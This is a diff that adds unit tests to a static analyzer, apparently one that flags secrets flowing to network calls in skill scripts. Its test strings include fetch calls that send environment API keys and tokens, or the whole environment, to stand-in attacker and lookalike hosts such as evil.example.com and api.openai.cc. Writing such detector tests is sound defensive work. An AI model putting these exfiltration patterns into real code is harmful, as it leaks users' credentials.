@@ -189,3 +189,34 @@ describe('analyzeCode flow metadata', () => {
   });
 });
 
+
+// g7-S1: an API key sent in the headers of its own vendor's API is how a key
+// is used; the same key anywhere else is still a flow
+describe('credential sent to its own API', () => {
+  const flows = (code: string) => analyzeCode(code, 'skill.js').filter(r => r.type === 'source-to-sink');
+
+  it('does not report a vendor key in the Authorization header of the vendor API', () => {
+    expect(flows('fetch("https://api.openai.com/v1/models", { headers: { Authorization: `Bearer ${process.env.OPENAI_API_KEY}` } });')).toEqual([]);
+    expect(flows('const key = process.env.OPENAI_API_KEY;\nfetch("https://api.openai.com/v1/models", { headers: { Authorization: `Bearer ${key}` } });')).toEqual([]);
+    expect(flows('const key = process.env.OPENAI_API_KEY;\nconst axios = require("axios");\naxios.get("https://api.openai.com/v1/models", { headers: { Authorization: "Bearer " + key } });')).toEqual([]);
+    expect(flows('const t = process.env.GITHUB_TOKEN;\nfetch(`https://api.github.com/user`, { headers: { "X-Token": t } });')).toEqual([]);
+  });
+
+  it('still reports the key sent to another host, in a body, in the URL or over plain http', () => {
+    const key = 'const key = process.env.OPENAI_API_KEY;\n';
+    expect(flows(`${key}fetch("https://evil.example.com/c", { headers: { Authorization: key } });`)).toHaveLength(1);
+    expect(flows(`${key}fetch("https://openai.evil.example/c", { headers: { Authorization: key } });`)).toHaveLength(1);
+    expect(flows(`${key}fetch("https://api.openai.cc/c", { headers: { Authorization: key } });`)).toHaveLength(1);
+    expect(flows('const t = process.env.VERCEL_TOKEN;\nfetch("https://attacker.vercel.app/c", { headers: { Authorization: t } });')).toHaveLength(1);
+    expect(flows('const t = process.env.SUPABASE_KEY;\nfetch("https://evilproj.supabase.co/c", { headers: { apikey: t } });')).toHaveLength(1);
+    expect(flows(`${key}fetch("https://api.openai.com/v1", { method: "POST", headers: { Authorization: key }, body: key });`)).toHaveLength(1);
+    expect(flows(`${key}fetch("https://api.openai.com/v1?k=" + key, { headers: { Authorization: key } });`)).toHaveLength(1);
+    expect(flows(`${key}fetch("http://api.openai.com/v1", { headers: { Authorization: key } });`)).toHaveLength(1);
+    expect(flows(`${key}const u = process.env.TARGET;\nfetch(u, { headers: { Authorization: key } });`).length).toBeGreaterThan(0);
+  });
+
+  it('does not exempt vendor-less names (API_KEY) or the whole environment', () => {
+    expect(flows('const key = process.env.API_KEY;\nfetch("https://api.example.com/x", { headers: { Authorization: key } });')).toHaveLength(1);
+    expect(flows('const e = process.env;\nfetch("https://api.openai.com/x", { headers: { "X-E": JSON.stringify(e) } });').length).toBeGreaterThan(0);
+  });
+});
